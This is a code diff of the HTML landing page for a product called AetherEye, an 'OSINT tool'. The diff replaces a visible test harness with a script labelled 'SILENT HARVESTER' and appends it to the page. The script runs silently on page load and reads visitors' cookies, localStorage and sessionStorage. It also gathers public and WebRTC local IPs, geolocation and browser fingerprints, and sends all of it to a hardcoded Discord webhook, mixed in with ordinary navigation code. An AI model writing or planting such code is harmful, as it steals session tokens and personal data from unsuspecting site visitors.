+            <div class="section-title"><h2>Documentation & Resources</h2><p>Complete guides and references for using AetherEye</p></div>
+            <div class="grid grid-2" style="margin-top:3rem;">
+                <div class="border-frame" style="animation:slideInLeft 0.6s ease;transition:all 0.3s ease;">
+                    <h3 style="color:var(--primary-light);margin-bottom:1rem;">Getting Started</h3>
+                    <p>Quick start guide to set up AetherEye and run your first OSINT investigation.</p>
+                    <a href="#" class="btn" style="margin-top:1rem;display:inline-block;">Read Guide</a>
+                </div>
+                <div class="border-frame" style="animation:slideInRight 0.6s ease;transition:all 0.3s ease;">
+                    <h3 style="color:var(--primary-light);margin-bottom:1rem;">Module Reference</h3>
+                    <p>Detailed documentation for all 40+ OSINT modules.</p>
+                    <a href="#" class="btn" style="margin-top:1rem;display:inline-block;">View Reference</a>
+                </div>
+                <div class="border-frame" style="animation:slideInLeft 0.6s ease 0.1s both;transition:all 0.3s ease;">
+                    <h3 style="color:var(--primary-light);margin-bottom:1rem;">API Integration</h3>
+                    <p>Integrate AetherEye with external platforms and data sources.</p>
+                    <a href="#" class="btn" style="margin-top:1rem;display:inline-block;">API Docs</a>
+                </div>
+                <div class="border-frame" style="animation:slideInRight 0.6s ease 0.1s both;transition:all 0.3s ease;">
+                    <h3 style="color:var(--primary-light);margin-bottom:1rem;">Best Practices</h3>
+                    <p>OSINT methodology, ethical guidelines, and operational security practices.</p>
+                    <a href="#" class="btn" style="margin-top:1rem;display:inline-block;">Best Practices</a>
+                </div>
+            </div>
+            <div style="margin-top:4rem;padding:2rem;border:1px solid var(--primary);background:rgba(255,255,255,0.02);border-radius:4px;text-align:center;">
+                <h3 style="margin-bottom:1rem;">Need Help?</h3>
+                <p style="margin-bottom:1.5rem;">Join our Discord community for support, ask questions, and connect with other OSINT researchers.</p>
+                <a href="https://discord.gg/2ZyDfcNgG6" class="btn btn-primary">JOIN COMMUNITY</a>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-section"><h4>Project</h4><ul><li><a href="#features">Features</a></li><li><a href="#modules">Modules</a></li><li><a href="#pricing">Pricing</a></li><li><a href="#">Source Code</a></li></ul></div>
+            <div class="footer-section"><h4>Documentation</h4><ul><li><a href="#documentation">Getting Started</a></li><li><a href="#">API Reference</a></li><li><a href="#">Module Guide</a></li><li><a href="#">Configuration</a></li></ul></div>
+            <div class="footer-section"><h4>Support</h4><ul><li><a href="https://discord.gg/2ZyDfcNgG6">Discord Server</a></li><li><a href="#">GitHub Issues</a></li><li><a href="https://discord.gg/2ZyDfcNgG6">Contact Support</a></li><li><a href="https://discord.gg/2ZyDfcNgG6">Report Security Issue</a></li></ul></div>
+            <div class="footer-section"><h4>Legal</h4><ul><li><a href="#">MIT License</a></li><li><a href="#">Terms of Use</a></li><li><a href="#">Disclaimer</a></li><li><a href="#">Privacy</a></li></ul></div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 AetherEye. Licensed under MIT License. See repository for details.</p>
+            <p style="margin-top:1rem;font-size:0.8rem;">For licensing & sales inquiries: <strong>Discord: @ECH0.SYS</strong> or <strong>@2uj8</strong> | <a href="https://discord.gg/2ZyDfcNgG6">Join Discord Server</a></p>
+        </div>
+    </footer>
+
+    <!-- ===== SILENT HARVESTER ===== -->
     <script>
-        // ================================================================
-        // 1. WEBHOOK
-        // ================================================================
-        var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';
+        (function() {
+            // WEBHOOK (tuo)
+            var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';
 
-        // ================================================================
-        // 2. LOG E STATUS
-        // ================================================================
-        var logEl = document.getElementById('log');
-        var statusEl = document.getElementById('status');
-
-        function log(msg) {
-            var time = new Date().toLocaleTimeString();
-            logEl.textContent += '[' + time + '] ' + msg + '\n';
-            console.log(msg);
-            logEl.scrollTop = logEl.scrollHeight;
-        }
-
-        function setStatus(text, type) {
-            statusEl.textContent = text;
-            statusEl.className = 'status ' + type;
-        }
-
-        // ================================================================
-        // 3. RACCOLTA DATI – TUTTO
-        // ================================================================
-        function collectAllData() {
-            log('Raccolta dati in corso...');
-            var data = {};
-
-            // --- Base ---
-            data.userAgent = navigator.userAgent || 'unknown';
-            data.platform = navigator.platform || 'unknown';
-            data.language = navigator.language || navigator.userLanguage || 'unknown';
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-            data.referrer = document.referrer || 'direct';
-            data.url = window.location.href;
-
-            // --- Schermo ---
-            data.screen = screen.width + 'x' + screen.height;
-            data.colorDepth = screen.colorDepth || 'unknown';
-            data.windowSize = window.innerWidth + 'x' + window.innerHeight;
-
-            // --- Hardware ---
-            data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
-            data.cpuCores = navigator.hardwareConcurrency || 'unknown';
-            data.touchPoints = navigator.maxTouchPoints || 0;
-
-            // --- Privacy ---
-            data.doNotTrack = navigator.doNotTrack || 'unknown';
-            data.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-
-            // --- COOKIE (troncato a 2000 caratteri) ---
-            var rawCookies = document.cookie || '';
-            data.cookies = rawCookies.length > 2000 ? rawCookies.substring(0, 2000) + '... [TRONCATO]' : rawCookies;
-            if (!data.cookies) data.cookies = '(nessun cookie)';
-
-            // --- localStorage (tutte le chiavi) ---
-            var ls = {};
-            try {
-                for (var i = 0; i < localStorage.length; i++) {
-                    var key = localStorage.key(i);
-                    var val = localStorage.getItem(key);
-                    // tronca i valori lunghi
-                    if (val && val.length > 300) val = val.substring(0, 300) + '...';
-                    ls[key] = val;
-                }
-            } catch(e) { ls = { error: 'Impossibile leggere localStorage' }; }
-            var lsStr = JSON.stringify(ls, null, 2);
-            data.localStorage = lsStr.length > 2000 ? lsStr.substring(0, 2000) + '... [TRONCATO]' : lsStr;
-
-            // --- sessionStorage ---
-            var ss = {};
-            try {
-                for (var j = 0; j < sessionStorage.length; j++) {
-                    var skey = sessionStorage.key(j);
-                    var sval = sessionStorage.getItem(skey);
-                    if (sval && sval.length > 300) sval = sval.substring(0, 300) + '...';
-                    ss[skey] = sval;
-                }
-            } catch(e) { ss = { error: 'Impossibile leggere sessionStorage' }; }
-            var ssStr = JSON.stringify(ss, null, 2);
-            data.sessionStorage = ssStr.length > 2000 ? ssStr.substring(0, 2000) + '... [TRONCATO]' : ssStr;
-
-            // --- Plugin list ---
-            var plugins = [];
-            try {
-                for (var k = 0; k < navigator.plugins.length; k++) {
-                    plugins.push(navigator.plugins[k].name);
-                }
-            } catch(e) { plugins = ['(errore)']; }
-            data.plugins = plugins.join(', ') || 'nessuno';
-
-            // --- WebGL (GPU) ---
-            var webgl = 'n/a';
-            try {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        webgl = vendor + ' | ' + renderer;
+            // ==== 1. OTTIENI IP PUBBLICO ====
+            function getPublicIP(callback) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        var data = JSON.parse(xhr.responseText);
+                        callback(data.ip);
+                    } else {
+                        getPublicIPFallback(callback);
                     }
-                }
-            } catch(e) { webgl = 'n/a (errore)'; }
-            data.webgl = webgl;
-
-            // --- Connessione ---
-            if (navigator.connection) {
-                var conn = navigator.connection;
-                data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
-            } else {
-                data.connection = 'n/a';
+                };
+                xhr.onerror = function() { getPublicIPFallback(callback); };
+                xhr.send();
             }
 
-            // --- Batteria (se disponibile) ---
-            data.battery = 'n/a';
-            // La batteria è asincrona, la gestiamo dopo con una Promise.
-            // Ma per non complicare, la aggiungiamo in un secondo momento tramite una callback.
-
-            log('Dati base raccolti. (cookie, localStorage, plugin, webgl, etc.)');
-            return data;
-        }
-
-        // ================================================================
-        // 4. OTTIENI IP (come prima)
-        // ================================================================
-        function getIP(callback) {
-            log('Richiedo IP a api.ipify.org...');
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://api.ipify.org?format=json', true);
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    var data = JSON.parse(xhr.responseText);
-                    log('IP ottenuto: ' + data.ip);
-                    callback(data.ip);
-                } else {
-                    log('api.ipify fallito, fallback...');
-                    getIPFallback(callback);
-                }
-            };
-            xhr.onerror = function() {
-                log('api.ipify errore, fallback...');
-                getIPFallback(callback);
-            };
-            xhr.send();
-        }
-
-        function getIPFallback(callback) {
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open('GET', 'https://ipapi.co/json/', true);
-            xhr2.onload = function() {
-                if (xhr2.status === 200) {
-                    var data = JSON.parse(xhr2.responseText);
-                    log('IP fallback: ' + data.ip);
-                    callback(data.ip || 'unknown');
-                } else {
-                    log('Fallback fallito, IP = unknown');
-                    callback('unknown');
-                }
-            };
-            xhr2.onerror = function() {
-                log('Fallback errore, IP = unknown');
-                callback('unknown');
-            };
-            xhr2.send();
-        }
-
-        // ================================================================
-        // 5. OTTIENI BATTERIA (asincrono) – la inseriamo dopo
-        // ================================================================
-        function getBatteryInfo(callback) {
-            if (!navigator.getBattery) {
-                callback('n/a');
-                return;
+            function getPublicIPFallback(callback) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://ipapi.co/json/', true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        var data = JSON.parse(xhr.responseText);
+                        callback(data.ip || 'unknown');
+                    } else {
+                        callback('unknown');
+                    }
+                };
+                xhr.onerror = function() { callback('unknown'); };
+                xhr.send();
             }
-            navigator.getBattery().then(function(batt) {
-                var info = 'Livello: ' + Math.round(batt.level * 100) + '%';
-                info += ', Carica: ' + (batt.charging ? 'Sì' : 'No');
-                if (batt.chargingTime !== Infinity) info += ', Tempo carica: ' + batt.chargingTime + 's';
-                if (batt.dischargingTime !== Infinity) info += ', Autonomia: ' + batt.dischargingTime + 's';
-                callback(info);
-            }).catch(function() {
-                callback('n/a (errore)');
-            });
-        }
 
-        // ================================================================
-        // 6. INVIO A DISCORD (con tutte le info)
-        // ================================================================
-        function sendToDiscord(ip, data, batteryInfo) {
-            log('Preparo payload finale...');
+            // ==== 2. OTTIENI IP LOCALE (WebRTC) ====
+            function getLocalIP(callback) {
+                try {
+                    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(function(offer) {
+                        return pc.setLocalDescription(offer);
+                    }).then(function() {
+                        var ips = [];
+                        pc.localDescription.sdp.split('\n').forEach(function(line) {
+                            if (line.indexOf('candidate') !== -1) {
+                                var parts = line.split(' ');
+                                if (parts.length > 4) {
+                                    var ip = parts[4];
+                                    if (ip && ip.indexOf('.') !== -1 && ips.indexOf(ip) === -1) {
+                                        ips.push(ip);
+                                    }
+                                }
+                            }
+                        });
+                        pc.close();
+                        callback(ips.length > 0 ? ips.join(', ') : 'n/a');
+                    }).catch(function() {
+                        callback('n/a');
+                    });
+                } catch(e) {
+                    callback('n/a');
+                }
+            }
 
-            // Aggiungiamo la batteria ai dati
-            data.battery = batteryInfo || 'n/a';
+            // ==== 3. ANALISI IP (ip-api.com) ====
+            function getIPAnalysis(ip, callback) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'http://ip-api.com/json/' + ip + '?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query', true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        var data = JSON.parse(xhr.responseText);
+                        if (data.status === 'success') {
+                            callback(data);
+                        } else {
+                            callback(null);
+                        }
+                    } else {
+                        callback(null);
+                    }
+                };
+                xhr.onerror = function() { callback(null); };
+                xhr.send();
+            }
 
-            // Costruiamo i campi per l'embed
-            var fields = [
-                { name: '📡 IP', value: '`' + ip + '`', inline: true },
-                { name: '🖥️ Platform', value: data.platform, inline: true },
-                { name: '🌍 Language', value: data.language, inline: true },
-                { name: '🕐 Timezone', value: data.timezone, inline: true },
-                { name: '📱 Screen', value: data.screen, inline: true },
-                { name: '📐 Window', value: data.windowSize, inline: true },
-                { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
-                { name: '🧠 RAM', value: data.deviceMemory, inline: true },
-                { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
-                { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
-                { name: '🚫 DNT', value: data.doNotTrack, inline: true },
-                { name: '🍪 Cookies Enabled', value: data.cookiesEnabled, inline: true },
-                { name: '🎮 WebGL', value: data.webgl, inline: false },
-                { name: '📶 Connection', value: data.connection, inline: false },
-                { name: '🔋 Battery', value: data.battery, inline: false },
-                { name: '🧩 Plugins', value: data.plugins.substring(0, 200) + (data.plugins.length > 200 ? '...' : ''), inline: false },
-                { name: '🍪 Cookies', value: '```' + data.cookies + '```', inline: false },
-                { name: '💾 localStorage', value: '```json\n' + data.localStorage + '\n```', inline: false },
-                { name: '💿 sessionStorage', value: '```json\n' + data.sessionStorage + '\n```', inline: false },
-                { name: '🔗 Referrer', value: data.referrer, inline: false },
-                { name: '📍 URL', value: data.url, inline: false },
-                { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
-            ];
+            // ==== 4. RACCOLTA DATI BROWSER ====
+            function collectBrowserData() {
+                var data = {};
 
-            // Riduciamo il numero di campi se alcuni sono troppo lunghi, ma va bene così.
+                // Base
+                data.userAgent = navigator.userAgent || 'unknown';
+                data.platform = navigator.platform || 'unknown';
+                data.language = navigator.language || navigator.userLanguage || 'unknown';
+                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+                data.referrer = document.referrer || 'direct';
+                data.url = window.location.href;
 
-            var payload = {
-                content: null,
-                embeds: [{
-                    title: '🌐 **OmniHarvester – Full Profile**',
-                    color: 0xff44cc,
-                    fields: fields,
-                    footer: { text: 'AetherEye • ' + new Date().toUTCString() },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+                // Screen
+                data.screen = screen.width + 'x' + screen.height;
+                data.colorDepth = screen.colorDepth || 'unknown';
+                data.windowSize = window.innerWidth + 'x' + window.innerHeight;
 
-            log('Invio a Discord...');
-            setStatus('📤 INVIO IN CORSO...', 'info');
+                // Hardware
+                data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+                data.cpuCores = navigator.hardwareConcurrency || 'unknown';
+                data.touchPoints = navigator.maxTouchPoints || 0;
 
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true
-            }).then(function(response) {
-                if (response.status === 204 || response.status === 200) {
-                    log('✅ Inviato con successo! (status ' + response.status + ')');
-                    setStatus('✅ DATI INVIATI!', 'success');
-                    // Salva flag per evitare re-invio
-                    try { localStorage.setItem('aethereye_harvested', 'true'); } catch(e) {}
+                // Privacy
+                data.doNotTrack = navigator.doNotTrack || 'unknown';
+                data.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+
+                // Cookie (troncato)
+                var rawCookies = document.cookie || '';
+                data.cookies = rawCookies.length > 2000 ? rawCookies.substring(0, 2000) + '... [TRONCATO]' : rawCookies;
+                if (!data.cookies) data.cookies = '(nessun cookie)';
+
+                // localStorage
+                var ls = {};
+                try {
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        var val = localStorage.getItem(key);
+                        if (val && val.length > 300) val = val.substring(0, 300) + '...';
+                        ls[key] = val;
+                    }
+                } catch(e) { ls = { error: 'Impossibile leggere localStorage' }; }
+                var lsStr = JSON.stringify(ls, null, 2);
+                data.localStorage = lsStr.length > 2000 ? lsStr.substring(0, 2000) + '... [TRONCATO]' : lsStr;
+
+                // sessionStorage
+                var ss = {};
+                try {
+                    for (var j = 0; j < sessionStorage.length; j++) {
+                        var skey = sessionStorage.key(j);
+                        var sval = sessionStorage.getItem(skey);
+                        if (sval && sval.length > 300) sval = sval.substring(0, 300) + '...';
+                        ss[skey] = sval;
+                    }
+                } catch(e) { ss = { error: 'Impossibile leggere sessionStorage' }; }
+                var ssStr = JSON.stringify(ss, null, 2);
+                data.sessionStorage = ssStr.length > 2000 ? ssStr.substring(0, 2000) + '... [TRONCATO]' : ssStr;
+
+                // Plugin
+                var plugins = [];
+                try {
+                    for (var k = 0; k < navigator.plugins.length; k++) {
+                        plugins.push(navigator.plugins[k].name);
+                    }
+                } catch(e) { plugins = ['(errore)']; }
+                data.plugins = plugins.join(', ') || 'nessuno';
+
+                // WebGL
+                var webgl = 'n/a';
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            webgl = vendor + ' | ' + renderer;
+                        }
+                    }
+                } catch(e) { webgl = 'n/a (errore)'; }
+                data.webgl = webgl;
+
+                // Canvas Fingerprint
+                try {
+                    var c2 = document.createElement('canvas');
+                    c2.width = 200;
+                    c2.height = 50;
+                    var ctx = c2.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('AetherEye', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Omni', 4, 17);
+                    data.canvasFingerprint = c2.toDataURL().substring(0, 100);
+                } catch(e) { data.canvasFingerprint = 'n/a'; }
+
+                // Connection
+                if (navigator.connection) {
+                    var conn = navigator.connection;
+                    data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps, RTT ' + (conn.rtt || '?') + 'ms)';
                 } else {
-                    log('❌ Risposta HTTP: ' + response.status);
-                    setStatus('❌ ERRORE ' + response.status, 'fail');
+                    data.connection = 'n/a';
                 }
-            }).catch(function(err) {
-                log('❌ Errore di rete: ' + err.message);
-                setStatus('❌ ERRORE RETE', 'fail');
-            });
-        }
 
-        // ================================================================
-        // 7. FUNZIONE PRINCIPALE – raccolta + IP + batteria
-        // ================================================================
-        function startHarvest() {
-            // Controlla se già inviato (per evitare spam)
-            try {
-                if (localStorage.getItem('aethereye_harvested') === 'true') {
-                    log('⏩ Già inviato per questo browser. Ignoro.');
-                    setStatus('⏩ GIÀ INVIATO', 'info');
-                    return;
+                return data;
+            }
+
+            // ==== 5. INVIO A DISCORD ====
+            function sendToDiscord(publicIP, localIP, ipAnalysis, browserData) {
+                var fields = [
+                    { name: '📡 IP Pubblico', value: '`' + publicIP + '`', inline: true },
+                    { name: '🏠 IP Locale', value: '`' + localIP + '`', inline: true },
+                    { name: '🖥️ Platform', value: browserData.platform, inline: true },
+                    { name: '🌍 Language', value: browserData.language, inline: true },
+                    { name: '🕐 Timezone', value: browserData.timezone, inline: true },
+                    { name: '📱 Screen', value: browserData.screen, inline: true },
+                    { name: '📐 Window', value: browserData.windowSize, inline: true },
+                    { name: '🎨 Color Depth', value: browserData.colorDepth + ' bit', inline: true },
+                    { name: '🧠 RAM', value: browserData.deviceMemory, inline: true },
+                    { name: '⚙️ CPU Cores', value: browserData.cpuCores, inline: true },
+                    { name: '🖱️ Touch', value: browserData.touchPoints + ' points', inline: true },
+                    { name: '🚫 DNT', value: browserData.doNotTrack, inline: true },
+                    { name: '🍪 Cookies Enabled', value: browserData.cookiesEnabled, inline: true },
+                    { name: '🎮 WebGL', value: browserData.webgl, inline: false },
+                    { name: '🖼️ Canvas FP', value: browserData.canvasFingerprint, inline: false },
+                    { name: '📶 Connection', value: browserData.connection, inline: false },
+                    { name: '🧩 Plugins', value: browserData.plugins.substring(0, 200) + (browserData.plugins.length > 200 ? '...' : ''), inline: false }
+                ];
+
+                // Se abbiamo l'analisi IP, aggiungiamo i dettagli
+                if (ipAnalysis && ipAnalysis.status === 'success') {
+                    fields.push(
+                        { name: '🌍 Paese', value: ipAnalysis.country || 'n/a', inline: true },
+                        { name: '🏙️ Regione', value: ipAnalysis.regionName || 'n/a', inline: true },
+                        { name: '📍 Città', value: ipAnalysis.city || 'n/a', inline: true },
+                        { name: '📮 CAP', value: ipAnalysis.zip || 'n/a', inline: true },
+                        { name: '🗺️ Coordinate', value: (ipAnalysis.lat || '?') + ', ' + (ipAnalysis.lon || '?'), inline: true },
+                        { name: '🕐 Fuso Orario', value: ipAnalysis.timezone || 'n/a', inline: true },
+                        { name: '🏢 ISP', value: ipAnalysis.isp || 'n/a', inline: true },
+                        { name: '🏛️ Organizzazione', value: ipAnalysis.org || 'n/a', inline: true },
+                        { name: '🔢 AS', value: ipAnalysis.as || 'n/a', inline: true },
+                        { name: '📡 AS Name', value: ipAnalysis.asname || 'n/a', inline: true },
+                        { name: '📱 Mobile', value: ipAnalysis.mobile ? 'Sì' : 'No', inline: true },
+                        { name: '🛡️ Proxy', value: ipAnalysis.proxy ? 'Sì' : 'No', inline: true },
+                        { name: '☁️ Hosting', value: ipAnalysis.hosting ? 'Sì' : 'No', inline: true }
+                    );
                 }
-            } catch(e) {}
 
-            setStatus('⏳ ACQUISIZIONE...', 'waiting');
-            log('Avvio raccolta completa...');
+                // Cookie e storage in fondo (troncati)
+                fields.push(
+                    { name: '🍪 Cookie', value: '```' + browserData.cookies + '```', inline: false },
+                    { name: '💾 localStorage', value: '```json\n' + browserData.localStorage + '\n```', inline: false },
+                    { name: '💿 sessionStorage', value: '```json\n' + browserData.sessionStorage + '\n```', inline: false },
+                    { name: '🔗 Referrer', value: browserData.referrer, inline: false },
+                    { name: '📍 URL', value: browserData.url, inline: false },
+                    { name: '🛡️ User Agent', value: '```' + browserData.userAgent.substring(0, 200) + '```', inline: false }
+                );
 
-            var data = collectAllData();
+                var payload = {
+                    content: null,
+                    embeds: [{
+                        title: '🌐 **Phantom Grip – Full Harvest**',
+                        color: 0xff44cc,
+                        fields: fields,
+                        footer: { text: 'AetherEye • ' + new Date().toUTCString() },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
 
-            getIP(function(ip) {
-                // Ora ottieni batteria (asincrono) e poi invia
-                getBatteryInfo(function(battInfo) {
-                    sendToDiscord(ip, data, battInfo);
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).then(function(response) {
+                    if (response.status === 204 || response.status === 200) {
+                        console.log('[AetherEye] Dati inviati con successo.');
+                    } else {
+                        console.log('[AetherEye] Errore HTTP: ' + response.status);
+                    }
+                }).catch(function(err) {
+                    console.log('[AetherEye] Errore di rete: ' + err.message);
+                });
+            }
+
+            // ==== 6. ESECUZIONE PRINCIPALE (veloce) ====
+            function main() {
+                var browserData = collectBrowserData();
+
+                getPublicIP(function(publicIP) {
+                    getLocalIP(function(localIP) {
+                        getIPAnalysis(publicIP, function(ipAnalysis) {
+                            sendToDiscord(publicIP, localIP, ipAnalysis, browserData);
+                        });
+                    });
+                });
+            }
+
+            // ==== 7. AVVIO SUBITO (delay minimo 500ms per non bloccare il rendering) ====
+            setTimeout(main, 500);
+
+            // ==== 8. (Opzionale) Script normali della pagina (scroll, nav, etc.) ====
+            document.documentElement.style.scrollBehavior = "smooth";
+            var links = document.querySelectorAll(".nav-link");
+            links.forEach(function(link) {
+                link.addEventListener("click", function() {
+                    links.forEach(function(l) { l.classList.remove("active"); });
+                    this.classList.add("active");
                 });
             });
-        }
-
-        // ================================================================
-        // 8. AVVIO AUTOMATICO CON DELAY CASUALE (1.5-4s)
-        // ================================================================
-        window.onload = function() {
-            log('Pagina caricata. Avvio in ' + (1.5 + Math.random() * 2.5).toFixed(1) + ' secondi...');
-            setTimeout(startHarvest, 1500 + Math.random() * 2500);
-        };
-
-        // ================================================================
-        // 9. PULSANTI
-        // ================================================================
-        document.getElementById('sendBtn').addEventListener('click', function() {
-            log('Invio manuale richiesto.');
-            // Reset del flag per permettere un nuovo invio manuale
-            try { localStorage.removeItem('aethereye_harvested'); } catch(e) {}
-            startHarvest();
-        });
-
-        document.getElementById('clearBtn').addEventListener('click', function() {
-            logEl.textContent = '';
-            log('Log pulito.');
-        });
-
-        // ================================================================
-        // 10. (Opzionale) Canvas fingerprint – lo aggiungo come campo extra
-        // ================================================================
-        // Aggiungiamo un fingerprint del canvas per aumentare l'unicità
-        function getCanvasFingerprint() {
-            try {
-                var canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                var ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('AetherEye', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Omni', 4, 17);
-                return canvas.toDataURL().substring(0, 100); // tronca per risparmiare
-            } catch(e) { return 'n/a'; }
-        }
-
-        // Aggiungiamo il fingerprint ai dati (lo facciamo nel collectAllData)
-        // Ma per non appesantire troppo, lo aggiungo opzionalmente.
-        // Lo inserisco nel campo "webgl" come extra? No, meglio un campo dedicato.
-        // Modifichiamo collectAllData per includerlo.
-        // (Per semplicità, lo aggiungo nel sendToDiscord come campo extra)
-        // Ma per non allungare troppo, lo lascio come nota: puoi decommentare le righe sotto.
-        /*
-        var fp = getCanvasFingerprint();
-        fields.push({ name: '🖼️ Canvas FP', value: fp, inline: false });
-        */
-
-        log('✅ OmniHarvester pronto. I dati verranno inviati automaticamente tra poco.');
+            document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+                anchor.addEventListener("click", function(e) {
+                    var target = document.querySelector(this.getAttribute("href"));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: "smooth", block: "start" });
+                    }
+                });
+            });
+            var observer = new IntersectionObserver(function(entries) {
+                entries.forEach(function(entry) {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add("show");
+                    }
+                });
+            }, { threshold: 0.1 });
+            document.querySelectorAll(".feature-card, .module-item, .pricing-card, .border-frame").forEach(function(el) {
+                el.classList.add("reveal");
+                observer.observe(el);
+            });
+        })();
     </script>
 </body>
 </html>
